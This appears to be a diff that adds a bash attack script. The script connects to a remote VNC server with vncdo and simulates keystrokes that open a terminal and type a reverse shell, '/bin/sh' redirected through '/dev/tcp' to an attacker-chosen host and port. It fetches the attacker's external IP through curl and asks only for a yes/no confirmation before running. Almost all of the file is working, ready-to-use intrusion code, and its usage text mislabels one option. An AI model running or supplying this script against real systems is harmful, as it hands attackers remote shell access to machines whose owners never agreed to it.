@@ -1,0 +1,111 @@
+#!/bin/bash
+
+echo 
+usage() { 
+echo "Usage: $0 --rhost=x.x.x.x [--rport=5900] [--lhost=x.x.x.x] [--rport=4444]";
+echo "";
+echo "[rhost] = Remote ip (required)";
+echo "[rport] = Remote port (default: 5900)";
+echo "[lhost] = Local host to bind default shell to (default: your external ip)";
+echo "[lport] = Local port to bind default shell to (default: 4444)";
+echo "";
+exit 1;
+}
+
+
+
+
+
+
+
+#######################
+
+rhost=''
+rport='5900'
+lhost=$(curl -s http://whatismijnip.nl |cut -d " " -f 5)
+lport='4444'
+
+optspec=":hv-:"
+while getopts "$optspec" optchar; do
+    case "${optchar}" in
+        -)
+            case "${OPTARG}" in
+                rhost)
+                    if [ -z "${!OPTIND}" ]; then
+                        usage
+                        exit
+                    fi
+                    val="${!OPTIND}"; OPTIND=$(( $OPTIND + 1 ))
+                    ;;
+                rhost=*)
+                    val=${OPTARG#*=}
+                    opt=${OPTARG%=$val}
+                    rhost=$val
+                    ;;
+                rport)
+                    val="${!OPTIND}"; OPTIND=$(( $OPTIND + 1 ))
+                    ;;
+                rport=*)
+                    val=${OPTARG#*=}
+                    opt=${OPTARG%=$val}
+                    rport=$val
+                    ;;
+                lhost)
+                    val="${!OPTIND}"; OPTIND=$(( $OPTIND + 1 ))
+                    ;;
+                lhost=*)
+                    val=${OPTARG#*=}
+                    opt=${OPTARG%=$val}
+                    lhost=$val
+                    ;;
+                lport)
+                    val="${!OPTIND}"; OPTIND=$(( $OPTIND + 1 ))
+                    ;;
+                lport=*)
+                    val=${OPTARG#*=}
+                    opt=${OPTARG%=$val}
+                    lport=$val
+                    ;;
+                *)
+                    if [ "$OPTERR" = 1 ] && [ "${optspec:0:1}" != ":" ]; then
+                        echo "Unknown option --${OPTARG}" >&2
+                    fi
+                    ;;
+            esac;;
+        h)
+            usage
+            exit 2
+            ;;
+    esac
+done
+
+
+
+#######################
+
+
+
+[ $# -eq 0 ] && { usage; exit 1; }
+
+
+
+
+
+
+echo "Remote host: $rhost !"
+echo "Remote port: $rport !"
+
+echo "Local host: $lhost !"
+echo "Local port: $lport !"
+echo
+echo 
+read -p "Are you sure? " -n 1 -r
+echo    # (optional) move to a new line
+if [[ ! $REPLY =~ ^[Yy]$ ]]
+then
+    exit 1
+fi
+
+
+
+vncdo -s $rhost::$rport key alt-ctrl-t pause 2 type 'nohup /bin/sh 0</dev/tcp/'"$lhost"'/'"$lport"' 1>&0 2>&0 &' key enter pause 1  type exit key enter
